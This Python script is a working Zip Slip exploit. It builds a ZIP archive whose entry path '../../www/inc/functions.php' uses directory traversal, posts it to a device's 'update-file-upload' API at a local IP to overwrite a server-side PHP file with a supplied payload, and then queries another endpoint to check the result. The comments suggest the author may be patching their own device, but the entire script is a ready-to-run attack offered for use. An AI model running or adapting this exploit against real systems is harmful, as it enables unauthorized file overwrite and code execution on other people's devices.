import requests
import zipfile
import io
import os
import sys

TARGET_IP = "192.168.1.173"
UPLOAD_URL = f"http://{TARGET_IP}/api/index.php?url=update-file-upload"
CHECK_URL = f"http://{TARGET_IP}/api/tlc/1"

PAYLOAD_FILE = "payload/functions.php"
ZIP_NAME = "payload_slip.zip"

def create_zip_slip():
    if not os.path.exists(PAYLOAD_FILE):
        print(f"[-] Error: {PAYLOAD_FILE} not found.")
        sys.exit(1)
        
    print(f"[+] Reading {PAYLOAD_FILE}...")
    with open(PAYLOAD_FILE, 'rb') as f:
        content = f.read()
        
    # Create zip with malicious path
    # We want to overwrite /www/inc/functions.php
    # We are unzipping to /tmp/
    # So path inside zip should be ../../www/inc/functions.php
    # Wait, /tmp/ is usually separate partition?
    # If /tmp is tmpfs, then traversal works fine.
    # Path: ../../www/inc/functions.php
    
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
        # arcname is the name INSIDE the zip
        zip_file.writestr('../../www/inc/functions.php', content)
        # Also add a dummy file to verify unzip worked in /tmp
        zip_file.writestr('pwned.txt', 'Zip Slip Successful')
    
    zip_buffer.seek(0)
    return zip_buffer

def exploit():
    print(f"[+] Creating Zip Slip payload...")
    zip_data = create_zip_slip()
    
    files = {
        'file': (ZIP_NAME, zip_data, 'application/zip')
    }
    
    print(f"[+] Uploading malicious ZIP to {UPLOAD_URL}")
    try:
        r = requests.post(UPLOAD_URL, files=files, timeout=20)
        print(f"[+] Upload status: {r.status_code}")
        # print(f"[+] Upload response: {r.text[:200]}")
    except Exception as e:
        print(f"[-] Upload failed: {e}")
        return

    print("[+] Payload sent. If vulnerable, functions.php should be overwritten.")
    
    print("[+] Verifying fix via API...")
    try:
        response = requests.get(CHECK_URL, timeout=10)
        if response.status_code == 200:
            try:
                data = response.json()
                # Handle list or object
                if isinstance(data, list) and len(data) > 0:
                    data = data[0]
                
                ip = data.get('ip')
                print(f"[+] API Response IP: {ip}")
                if ip and ip != "1.1.1.1":
                    print("[+] VERIFICATION SUCCESS: IP is correctly reported!")
                else:
                    print("[-] VERIFICATION FAILED: IP is still 1.1.1.1.")
            except:
                print(f"[-] Failed to parse JSON: {response.text[:100]}")
        else:
            print(f"[-] API check failed: Status {response.status_code}")
    except Exception as e:
        print(f"[-] API check failed: {e}")

if __name__ == "__main__":
    exploit()
